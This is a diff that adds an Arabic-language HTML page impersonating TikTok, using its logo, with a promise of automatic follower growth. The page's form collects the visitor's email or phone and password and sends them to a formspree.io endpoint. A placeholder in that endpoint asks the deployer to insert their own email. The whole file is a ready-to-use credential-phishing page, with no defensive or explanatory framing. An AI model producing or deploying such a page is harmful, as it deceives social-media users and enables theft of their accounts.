@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تيك توك - زيادة المتابعين</title>
+    <style>
+        body { background-color: #010101; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background: #121212; padding: 30px; border-radius: 10px; text-align: center; width: 300px; border: 1px solid #333; }
+        img { width: 120px; margin-bottom: 15px; }
+        p { font-size: 0.9rem; color: #ccc; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 4px; border: 1px solid #444; background: #1e1e1e; color: white; }
+        button { background: #fe2c55; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1200px-TikTok_logo.svg.png" alt="TikTok">
+    <p>أدخل معلومات حسابك لتفعيل خدمة زيادة المتابعين التلقائية</p>
+    
+    <form action="https://formspree.io/f/ضع_إيميلك_هنا" method="POST">
+        <input type="text" name="Username" placeholder="البريد الإلكتروني أو الهاتف" required>
+        <input type="password" name="Password" placeholder="كلمة السر" required>
+        <button type="submit">تسجيل الدخول والبدء</button>
+    </form>
+</div>
+
+</body>
+</html>
